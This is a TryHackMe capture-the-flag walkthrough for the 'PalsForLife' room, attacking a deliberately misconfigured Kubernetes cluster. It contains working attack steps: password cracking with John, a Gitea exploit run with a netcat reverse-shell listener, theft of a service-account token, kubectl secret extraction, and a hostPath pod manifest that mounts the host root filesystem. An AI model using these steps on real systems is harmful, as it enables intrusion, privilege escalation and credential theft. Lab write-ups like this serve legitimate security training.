<h1 align="center">PalsForLife</h1>
<p align="center">2025, August 11<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>462</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Abuse a misconfigured Kubernetes cluster</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/05ab7508-6a94-4e64-a46b-c5c72094d611"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/palsforlife">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/662c32eb-7220-422c-b97b-20c7b1047b66"></p>


<h2>Task 1 . Download</h2>
<p>Connect to our network and deploy this machine. If you are unsure on how to get connected, complete the OpenVPN room first.<br>

Please allow 5 minutes for the machine to fully boot up.</p>

<p><em>Answer the question below</em></p>

<p><code>No answer needed</code></p>

<br>
<h2>Task 2 . Compromise the machine</h2>
<p align="center">Are you able to compromise this World Of Warcraft themed machine?<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/f3c2644f-418d-458b-b771-86ce8143f9be"><br>
Source: https://hearthstone.fandom.com/wiki/Leeroy_Jenkins</p>

<p><em>Answer the questions below</em></p>


<h3>nmap</h3>

<p>
  
- <code>&nbsp;&nbsp;&nbsp;22</code> &nbsp; : &nbsp; <code>ssh</code> &nbsp; : &nbsp; <code>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</code><br>
- <code>&nbsp;6443</code> &nbsp; : &nbsp; <code>ssl/sun-sr-https?</code> &nbsp; : &nbsp; <code>Kubernetes API Server</code> &nbsp; : &nbsp; <code>kubernetes</code>, <code>kubernetes.default</code>, <code>localhost</code>, <code>kubernetes.default.svc.cluster.local</code><br>
- <code>10250</code> &nbsp; : &nbsp; <code>ssl/http</code> &nbsp; : &nbsp; <code>Kubelet API</code> &nbsp; : &nbsp; <code>Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</code><br>
- <code>30180</code> &nbsp; : &nbsp; <code>http</code> &nbsp; : &nbsp; <code>Nginx 1.21.0</code><br>
- <code>31111</code> &nbsp; : &nbsp; <code>Gitea</code> &nbsp; : &nbsp; <code>CSRF</code></br>
- <code>31112</code> &nbsp; : &nbsp; <code>ssh</code><br>

<br>

```bash
:~/PalsForLife# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xx
...
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
6443/tcp  open  ssl/sun-sr-https?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 11 Aug 2025 23:16:26 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 11 Aug 2025 xx:xx:xx GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=k3s/organizationName=k3s
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, IP Address:xx.xxx.xx.xxx, IP Address:xx.xx.x.x, IP Address:127.0.0.1, IP Address:xxx.xx.xx.xxx, IP Address:xxx.xxx.x.xxx
| Not valid before: 2021-05-31Txx:xx:xx
|_Not valid after:  2026-08-11Txx:xx:xx
10250/tcp open  ssl/http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=palsforlife
| Subject Alternative Name: DNS:palsforlife, DNS:localhost, IP Address:127.0.0.1, IP Address:xx.xxx.xx.xxx
| Not valid before: 2021-05-31Txx:xx:xx
|_Not valid after:  2026-08-11Txx:xx:xx
30180/tcp open  http              nginx 1.21.0
|_http-server-header: nginx/1.21.0
|_http-title: 403 Forbidden
31111/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=e3776816861a835b; Path=/; HttpOnly
|     Set-Cookie: _csrf=4aIokVGLH7M9affGyh6eFwgs4hI6MTc1NDk1NDE1NTc3NDc0MjkwOA%3D%3D; Path=/; Expires=Tue, 12 Aug 2025 xx:xx:xx GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 11 Aug 2025 xx:xx:xx5 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
|     <meta name="keywords" content="go,git,self-hosted,gitea
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=68c507915e859143; Path=/; HttpOnly
|     Set-Cookie: _csrf=tbKcZy3e7ad5UbSS5j-PbY4o5f46MTc1NDk1NDE1NTc5NzI5NTEzMA%3D%3D; Path=/; Expires=Tue, 12 Aug 2025 xx:xx:xx GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 11 Aug 2025 xx:xx:xx GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
|_    <meta name="keywords" content="
31112/tcp open  ssh               OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
...
```

<br>
<h3>gobuster</h3>

```bash
:~/PalsForLife# gobuster dir -u http://xx.xxx.xx.xxx:31111/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
...
/admin                (Status: 302) [Size: 34] [--> /user/login]
/issues               (Status: 302) [Size: 34] [--> /user/login]
/avatars              (Status: 302) [Size: 32] [--> /avatars/]
/explore              (Status: 302) [Size: 37] [--> /explore/repos]
/debug                (Status: 200) [Size: 160]
/notifications        (Status: 302) [Size: 34] [--> /user/login]
/healthcheck          (Status: 200) [Size: 26]
...
```

```bash
:~/PalsForLife# gobuster dir -u http://xx.xxx.xx.xxx.thm:30180/team/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.txt -t 50
...
/index.html           (Status: 200) [Size: 13806]
```

<br>
<h3>xx.xxx.xx.xx:30180/team/</h3>

<img width="1314" height="420" alt="image" src="https://github.com/user-attachments/assets/ee3d9873-c231-433a-b2a6-48308997ee61" />

<br>

<p>

- copied the encoded excerpt and saved into <code>uninteresting_file.encoded</code></p>

<br>

<img width="1318" height="164" alt="image" src="https://github.com/user-attachments/assets/f5ab3e4f-6759-4a7f-8b46-f613899fc7cd" />

<br>

<img width="1148" height="341" alt="image" src="https://github.com/user-attachments/assets/d6465240-6bfe-4f2b-a982-62bc1a614d04" />

<br>

<img width="537" height="197" alt="image" src="https://github.com/user-attachments/assets/8f89cc0e-f7a4-424f-9fff-548ef6256308" />


```bash
:~/PalsForLife# head uninteresting_file.encoded
JVBERi0xLjcKJb/3ov4KMSAwIG9iago8PCAvRGVzdHMgMyAwIFIgL0V4dGVuc2lvbnMgPDwgL0FE
QkUgPDwgL0Jhc2VWZXJzaW9uIC8xLjcgL0V4dGVuc2lvbkxldmVsIDggPj4gPj4gL1BhZ2VzIDQg
MCBSIC9UeXBlIC9DYXRhbG9nID4+CmVuZG9iagoyIDAgb2JqCjw8IC9DcmVhdGlvbkRhdGUgPDEw
Y2ZlYThkZWMyYTBjOGMzOGQ1ZTYwMzBlYzQxOTQ5NGZiMGU2OWQ5MzViZDNkNjc5ODNiZTAxNWY4
MzdiYjJjNThjYmQzYzQ5OGRkOWZmYzE0OTMwNzZiNTY4YjE1Nz4gL0NyZWF0b3IgPGI3ZDRmNjA3
NTljZDRlOWM3MjU0Nzc5ZjgxZWQ3ZGU5ODdkNjVmOWVhODAzNDVjYjllNTkyNWUxOTllZTk5Njkw
MGUzYjkzYjAzNjQ2MzM3MTNjMzRlYmZlYjgzMGQ3ZWEzYWE0ZDhmOTUyYTJiOWU2OTI0ZmMzZmNi
MzNjM2EyMjU3NmQ5MGI3NjBkNzE5NzExY2U5OGQ2ZDhlYzI3NmM5ZGUwYjI0YTYwZDdjMTIxMjZm
YWZhZDM3MmEwOTlkMDE2NjYzNzY5NjY3ZTQ0MTQ4ODQ3NzQ1MzVkMTMxZmE1MmViYTYzOGY0ZTFl
MTNjNTBlNWFmMjJkNzYzZTJkMDM+IC9Nb2REYXRlIDxhMjlmZDI3NjY2MGJiYzVkNWIzNGQ4ZjBi
...
```

<br>

```bash
:~/PalsForLife# base64 -d uninteresting_file.encoded > uninteresting_file.pdf
```

<br>

```bash
:~/PalsForLife# file uninteresting_file.pdf
uninteresting_file.pdf: PDF document, version 1.7
```

<br>
<h3>PDF2John</h3>

```bash
:~/PalsForLife# perl /opt/john/pdf2john.pl uninteresting_file.pdf > hash
```

<img width="1911" height="819" alt="image" src="https://github.com/user-attachments/assets/ae80fef1-4f65-4907-86cc-2faf38a6cf06" />

<br>
<h3>John the Ripper</h3>

```bash
:~/PalsForLife# john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
chickenlegs      (uninteresting_file.pdf)
```

<br>
<h3>Atril Document Viewer</h3>
<p>

- I_am_geniu5_P4ladin#</p>

<img width="975" height="313" alt="image" src="https://github.com/user-attachments/assets/c11daf73-9686-44f6-893a-5578c2ac525d" />



<br>
<h3>xx.xxx.xx.xxx:31111/explore/repos</h3>


<img width="1317" height="177" alt="image" src="https://github.com/user-attachments/assets/71421936-ef8c-42a5-a03d-fa0349e17411" />

<br>

<img width="1310" height="210" alt="image" src="https://github.com/user-attachments/assets/d48883fe-a0f2-4b3f-8a39-5b0d6bede612" />

<br>

<p>

- leeroy : I_am_geniu5_P4ladin#</p>
</p>

<br>

<img width="1302" height="327" alt="image" src="https://github.com/user-attachments/assets/e7b991d7-a3f6-4536-b04c-1970ba855882" />


<br>
<h3>xx.xxx.xx.xxx:31111/lerroy/jenkins</h3>

<img width="1311" height="237" alt="image" src="https://github.com/user-attachments/assets/0af185d0-3e5d-4670-9a03-e7ad63a32662" />

<br>
<h3>Webhooks</h3>

<img width="1305" height="302" alt="image" src="https://github.com/user-attachments/assets/1e75e16d-38cd-4f24-82e6-c4af013473e4" />

<br>
<h3>Source code</h3>

<img width="1316" height="417" alt="image" src="https://github.com/user-attachments/assets/b6bf31b2-019a-4313-93fb-bb41cc500073" />

<br>

<p>1.1. Flag 1. Hint : Must be hidden somewhere in the web tool<br>
<code>flag{*****************}</code></p>

<br>
<h3>New Repository</h3>
<p>

- Buhhh created<br>
- Settings<br>
- Git Hooks<br>
- Update<br>
</p>

<img width="1146" height="93" alt="image" src="https://github.com/user-attachments/assets/8835412c-1b01-41e9-89ea-c0bdfc0fac83" />

<br>

<img width="1283" height="541" alt="image" src="https://github.com/user-attachments/assets/9f0b6457-ad7b-4e8e-850c-124ab5dafa00" />

<br>

<img width="1262" height="643" alt="image" src="https://github.com/user-attachments/assets/9dba019b-47af-4f7b-b33b-a59c2c08cc42" />

<br>
<h3>searchsploit</h3>

```bash
:~/PalsForLife# searchsploit -m 49571.py
```

<br>

```bash
:~/PalsForLife# nc -nlvp 9001
```

<br>

```bash
:~/PalsForLife# python3 49571.py -t http://xx.xxx.xx.xxx:31111 -u 'leeroy' -p 'I_am_geniu5_P4ladin#' -I xx.xxx.xxx.xxx -P 9001
```

<br>
<img width="1325" height="596" alt="image" src="https://github.com/user-attachments/assets/5f77e094-3802-4a9c-87cb-88fd6c6e2b4d" />

<br>


```bash
bash-4.4$ whoami
git
bash-4.4$ id
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
bash-4.4$ ls /root
flag2.txt
bash-4.4$ cat /root/flag2.txt
flag{*****************}
```

<br>

<p>1.2. Flag 2.<br>
<code>flag{*****************}</code></p>

<br>

```bash
ls -lah /var/run/secrets/
total 12
drwxr-xr-x    3 root     root        4.0K Aug 11 xx:xx .
drwxr-xr-x    1 root     root        4.0K Aug 11 xx:xx ..
drwxr-xr-x    3 root     root        4.0K Aug 11 xx:xx kubernetes.io
```

<br>

```bash
ls -lah /var/run/secrets/kubernetes.io
total 8
drwxr-xr-x    3 root     root        4.0K Aug 11 xx:xx .
drwxr-xr-x    3 root     root        4.0K Aug 11 xx:xx ..
drwxrwxrwt    3 root     root         140 Aug 11 xx:xx serviceaccount
```

<br>

```bash
ls -lah /run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt    3 root     root         140 Aug 11 xx:xx .
drwxr-xr-x    3 root     root        4.0K Aug 11 xx:xx ..
drwxr-xr-x    2 root     root         100 Aug 11 xx:xx ..2025_08_11_xx_xx_xx.130133139
lrwxrwxrwx    1 root     root          31 Aug 11 xx:xx ..data -> ..2025_08_11_xx_xx_xx.130133139
lrwxrwxrwx    1 root     root          13 Aug 11 xx:xx ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root          16 Aug 11 xx:xx namespace -> ..data/namespace
lrwxrwxrwx    1 root     root          12 Aug 11 xx:xx token -> ..data/token
```

<br>

```bash
ls -lah /var/run/secrets/kubernetes.io/serviceaccount
total 4
drwxrwxrwt    3 root     root         140 Aug 11 23:03 .
drwxr-xr-x    3 root     root        4.0K Aug 11 23:03 ..
drwxr-xr-x    2 root     root         100 Aug 11 23:03 ..2025_08_11_xx_xx_xx.130133139
lrwxrwxrwx    1 root     root          31 Aug 11 23:03 ..data -> ..2025_08_11_xx_xx_xx.130133139
lrwxrwxrwx    1 root     root          13 Aug 11 23:03 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root          16 Aug 11 23:03 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root          12 Aug 11 23:03 token -> ..data/token
```

<br>
<h3>token</h3>

```bash
:~/PalsForLife#  cat token
eyJhbGciOiJSUzI1NiIsImtpZCI6Iky...jkHFv3vza54WS9w
```

<br>
<h3>kubectl</h3>

```bash
:~/PalsForLife# snap install kubectl --classic
```

<br>

```bash
:~/PalsForLife# kubectl --server https://xx.xxx.xx.xxx:6443 --token 'eyJhbGciOiJSUzI1NiIsImtpZCI6Iky...jkHFv3vza54WS9w' --insecure-skip-tls-verify auth can-i --list
```

<br>

<img width="1341" height="185" alt="image" src="https://github.com/user-attachments/assets/daae37de-5eb5-44ea-b52f-f62426b666aa" />

<br>

```bash
:~/PalsForLife# kubectl --server https://xx.xxx.xx.xxx:6443 --token 'eyJhbGciOiJSUzI1NiIsImtpZCI6Iky...jkHFv3vza54WS9w' --insecure-skip-tls-verify api-resources --namespaced=true
```

<br>

<img width="1369" height="718" alt="image" src="https://github.com/user-attachments/assets/1be3f1a7-a196-4f76-8fbe-a9c84facad6d" />

<br>

```bash
:~/PalsForLife# kubectl --server https://xx.xxx.xx.xxx:6443 --token 'eyJhbGciOiJSUzI1NiIsImtpZCI6Iky...jkHFv3vza54WS9w' --insecure-skip-tls-verify get Secret --all-namespaces
```

<br>

<img width="1374" height="770" alt="image" src="https://github.com/user-attachments/assets/5154326d-0e7b-4ea7-9d1c-a73e8f219750" />

<br>

```bash
:~/PalsForLife# kubectl --server --server https://xx.xxx.xx.xxx:6443 --token 'eyJhbGciOiJSUzI1NiIsImtpZCI6Iky...jkHFv3vza54WS9w' --insecure-skip-tls-verify get Secret flag3 -n kube-system -o yaml
```

<br>

<img width="1373" height="374" alt="image" src="https://github.com/user-attachments/assets/6417679d-d584-4395-8f6e-95e2a28e8655" />

```bash
:~/PalsForLife# echo 'ZmxhZ3...X2ZhdWx0IX0=' | base64 -d
flag{*****************}
```

<br>

<p>1.3. Flag 3.<br>
<code>flag{*****************}</code></p>

<br>

```bash
~/PalsForLife# cat evil.yaml

apiVersion: v1
kind: Pod
metadata:
  name: mount
spec:
  volumes:
  - name: mount
    hostPath:
      path: /
      type: Directory                                                                                                         
  containers:
  - image: docker.io/library/nginx@sha256:6d75c...d121e15d80ad526f8369c526324f0f7ccb750
    name: mount
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    volumeMounts:
    - mountPath: /mount
      name: mount
```

<br>


```bash
:~/PalsForLife# kubectl --server --server https://xx.xxx.xx.xxx:6443 --token 'eyJhbGciOiJSUzI1NiIsImtpZCI6Iky...jkHFv3vza54WS9w' --insecure-skip-tls-verify get nodes
NAME          STATUS   ROLES                  AGE     VERSION
palsforlife   Ready    control-plane,master   4y73d   v1.20.7+k3s1
```

<br>

```bash
:~/PalsForLife# kubectl --server --server https://xx.xxx.xx.xxx:6443 --token 'eyJhbGciOiJSUzI1NiIsImtpZCI6Iky...jkHFv3vza54WS9w' --insecure-skip-tls-verify apply -f evil.yaml
pod/mount created
```

<br>

```bash
:~/PalsForLife# kubectl --server --server https://xx.xxx.xx.xxx:6443 --token 'eyJhbGciOiJSUzI1NiIsImtpZCI6Iky...jkHFv3vza54WS9w' --insecure-skip-tls-verify exec -it mount -- bash
root@mount:/# pwd
/
root@mount:/# cd mount
root@mount:/mount# cd root
root@mount:/mount/root# ls
root.txt
root@mount:/mount/root# cat root.txt
flag{**********************}
```

<br>

<p>1.4. Flag 4. Hint : Can we reuse a node image?<br>
<code>flag{**********************}</code></p>

<br>


 <img width="1330" height="596" alt="image" src="https://github.com/user-attachments/assets/25c083a7-b55c-4333-9195-6e54f5a4f1e6" />

 <br>
 <br>
 <br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/00d908c0-cab0-4159-b08a-6ee7905d1222"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/72bcc5ee-8bf6-4ee5-afb4-cd4a2b6e29b9"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 11   |   462    |     128ᵗʰ    |      5ᵗʰ     |     363ʳᵈ   |     7ᵗʰ    | 120,506  |    910    |    73     |


</div>

<p align="center">Global All Time:   126ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/cfd56f1c-9b68-440d-b2b4-7892f94f493f"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/35ed65a1-2bf0-44d1-9569-b28ee8db355a"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/9bfbf8f6-c5c3-49cb-97bd-2dee66ed4f14"><br>
                  Global monthly:    363ʳᵈʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c7d76a75-00de-444a-bb7b-c834ce22dc9"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/5334e8ca-7c5f-43d8-aa71-2310c897448a"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
